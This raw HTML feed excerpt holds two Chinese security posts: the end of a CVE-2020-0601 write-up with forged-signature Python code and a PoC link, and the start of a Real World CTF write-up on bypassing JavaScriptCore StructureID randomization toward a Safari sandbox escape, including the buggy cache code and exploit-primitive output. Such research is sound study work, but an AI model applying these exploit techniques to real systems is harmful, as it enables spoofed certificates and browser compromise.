    &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fsig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;sig&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;#34;fsig&amp;#34;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsig&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# 分别进行签名校验&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dsa&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;validate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;validate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fsig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_pub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Success!&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6b2442f547a6aaeced8f6872dc7b0a98_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;488&quot; data-rawheight=&quot;145&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;488&quot; data-original=&quot;https://pic1.zhimg.com/v2-6b2442f547a6aaeced8f6872dc7b0a98_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6b2442f547a6aaeced8f6872dc7b0a98_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;488&quot; data-rawheight=&quot;145&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;488&quot; data-original=&quot;https://pic1.zhimg.com/v2-6b2442f547a6aaeced8f6872dc7b0a98_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-6b2442f547a6aaeced8f6872dc7b0a98_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;运行结果如下，我们可以看到用不同的私钥加密获得的签名是不同的,但是由于公钥的生成元G被我们篡改，所以验证也会通过。&lt;/p&gt;&lt;p&gt;最后我们提供一个能用的[poc](&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/ollypwn/cve-2020-0601&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/ollypwn/cve-&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;2020-0601&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;),仅供学习交流。&lt;/p&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;这个漏洞的原理其实十分简单，就是小学二年级学过的代数。我们应该注意密码的完整性的校验，更要好好学数学。&lt;/p&gt;&lt;h2&gt;参考：&lt;/h2&gt;&lt;p&gt;[维基百科](&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/ElGamal%25E5%258A%25A0%25E5%25AF%2586%25E7%25AE%2597%25E6%25B3%2595&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;zh.wikipedia.org/wiki/E&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;lGamal%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;)&lt;/p&gt;&lt;p&gt;[安全客](&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.anquanke.com/post/id/159893&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;简析ECC攻击方法之Pohlig-Hellman - 安全客，安全资讯平台&lt;/a&gt;)&lt;/p&gt;&lt;p&gt;[ECC原理解析](&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.cnblogs.com/Kalafinaian/p/7392505.html&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;ECC椭圆曲线详解(有具体实例) - Kalafinaian - 博客园&lt;/a&gt;)&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2020-02-05-103665076</guid>
<pubDate>Wed, 05 Feb 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>如何绕过JSC最新缓解措施并逃逸Safari沙箱</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-12-14-96069221.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/96069221&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b9eec9b5bff18bab36a19ac491a71b20_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文讨论了一种绕过JavaScriptCore(JSC)最新的StructureID随机化的技术实践，并阐述了通过WebKit IPC逃逸Safari沙箱的具体利用技术。作为以上技术的载体，我们将整个过程呈现在了Real World CTF 2019 决赛当中 (&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//realworldctf.com&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;realworldctf.com&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;), 期待能为Safari/WebKit浏览器的安全研究添砖加瓦。 &lt;/p&gt;&lt;p&gt;本文内容与 &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/8e54c6f265d1887503798285c3f993a7&quot; data-hash=&quot;8e54c6f265d1887503798285c3f993a7&quot; data-hovercard=&quot;p$b$8e54c6f265d1887503798285c3f993a7&quot;&gt;@许文&lt;/a&gt; 共同创作。感谢&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.cc.gatech.edu/~mxu80/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;徐萌&lt;/a&gt;为本文的改善提出的建议。感谢 &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/372a9eeb0267cf732f5b73265f3dc307&quot; data-hash=&quot;372a9eeb0267cf732f5b73265f3dc307&quot; data-hovercard=&quot;p$b$372a9eeb0267cf732f5b73265f3dc307&quot;&gt;@shiki7&lt;/a&gt; 与我一起把这个题成功呈现到Real World CTF中。&lt;/p&gt;&lt;h2&gt;攻击JavaScriptCore&lt;/h2&gt;&lt;p&gt;在本次比赛当中，我们刻意在最新版本JavaScriptCore中引入了一个runtime漏洞。通过引入未预期的JIT优化副作用，我们可以成功利用这个漏洞。&lt;/p&gt;&lt;h2&gt;对FastStructureCache的分析&lt;/h2&gt;&lt;p&gt;我们为RegExp相关的structure创建了一个分配缓存，名字叫做FastStructureCache。其完整内容可以从&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/HQ1995/96d8922f915bc44ca794611344324a8f/raw/41d80298dc276d22d1efcc2b63a4ccf93266ed68/patch.diff&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;这里&lt;/a&gt;找到。&lt;/p&gt;&lt;p&gt;下面是对这个漏洞关键部分做的一些注解。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FastStructureCache&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSNonFinalObject&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSNonFinalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheSizeMax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheSizeUsed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;createStructureFastPath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;n&quot;&gt;SGlobalObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JSValue&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TypeInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typeInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastCacheSizeMax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheSizeMax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;c1&quot;&gt;// * [1]
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// Later, we will set the correct globalObject and prototype
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typeInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastCacheSizeUsed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheSizeMax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fastCacheStructure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fastCacheSizeUsed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// * [2]
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;            &lt;span class=&quot;c1&quot;&gt;// set the correct global object and prototype
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setPrototypeWithoutTransition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setGlobalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;fastCacheSizeUsed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globalObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prototype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typeInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;protected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;FastStructureCache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Structure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;structure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 [1] 处，我们创建了缓存。尽管现在它里面的prototype都是不正确的，但是我们在后面真正要使用它们的时候会在 [2] 处设置对应的正确prototype。这至少引入了两个bug。首先，type info和 class info是永远不会变的，所以后期使用这些structure的对象的时候这些信息全都是错误的。不过我们并没有去研究过这个bug是不是可以利用的或者怎么利用。然后，图1 比较了&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/WebKit/webkit/blob/master/Source/JavaScriptCore/runtime/StructureInlines.h%23L39&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Structure::create&lt;/a&gt;中的常规过程和FastStructureCache的区别，显然，FastStructureCache没有用didBecomePrototype()这个函数去标记这个对象已经成了prototype。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;847&quot; data-rawheight=&quot;980&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;847&quot; data-original=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;847&quot; data-rawheight=&quot;980&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;847&quot; data-original=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-49d9b493879883da9dad2a8b7f8964fc_b.jpg&quot;/&gt;&lt;figcaption&gt;图1. 错误的创建structure的过程&lt;/figcaption&gt;&lt;/figure&gt;&lt;h2&gt;基本漏洞利用原语构建&lt;/h2&gt;&lt;p&gt;根据lokihardt的&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//bugs.chromium.org/p/project-zero/issues/detail%3Fid%3D1649&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;一些注解&lt;/a&gt;，我们可以得知JSC根本就不允许Proxy对象出现在Native数组的原型链当中。但是，有了这个bug我们便可以打破这个JSC的assumption并做一些有趣的事情。&lt;/p&gt;&lt;p&gt;图2 阐述了其中因由，假设已经有一个RegExp对象出现在了一个Native数组的原型链中。当我们试图把一个Proxy对象设置在这个RegExp的原型链当中，不会触发任何的转换来把这个数组转换为swithToSlowPutArrayStorage类型的数组。这样来说，我们便可以照葫芦画瓢的利用lokihardt已经讲过的技巧来使用HasIndexedProperty这个IR来向JSC引入非预期的副作用。并造成类型混淆。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1101&quot; data-rawheight=&quot;806&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1101&quot; data-original=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1101&quot; data-rawheight=&quot;806&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1101&quot; data-original=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-1a80005a6e6e89e73e619dc6e6a9e622_b.jpg&quot;/&gt;&lt;figcaption&gt;图2. JSC在为对象设置Prototype时候的检查&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;我们给出了addrOf和fakeObj的原语的&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//gist.githubusercontent.com/HQ1995/96d8922f915bc44ca794611344324a8f/raw/049e280021d72b390df923bbda59216af0996fa2/poc.js&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;POC&lt;/a&gt;,它的执行效果如下:&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;➜  ./jsc pwn.js
0x00007fa42ebdc240
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;    &lt;span class=&quot;m&quot;&gt;27955&lt;/span&gt; segmentation fault  ./jsc pwn.js&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;泄露StructureID&lt;/h2&gt;&lt;p&gt;起初当我们在Mojave上开发&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//twitter.com/insu_yun_en/status/1153742447115153413%3Fs%3D20&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;full-chain利用&lt;/a&gt;之际，structureID的7-bit entropy已经被引入Webkit master。为了利用该漏洞，在那时我们便成功找到了一种基于JIT编译器的通用绕过方法。&lt;/p&gt;&lt;p&gt;无独有偶，BlackHat EU 上的一个&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;talk&lt;/a&gt;也公开了一种基于runtime function的方法来泄露structureID的方法。这些方法都是基于一个简单有效的事实: JSC里面并不是所有的内建函数，机制都依赖正确的structureID。&lt;/p&gt;&lt;p&gt;图3阐述了利用Function.prototype.toString.call()来泄露structureID的过程。我们需要伪造三个对象，其中包括一个没有正确structureID的伪造函数对象。如此一来，我们不仅能泄露structureID的entropy，还可以泄露一个butterfly指针。&lt;/p&gt;&lt;figure 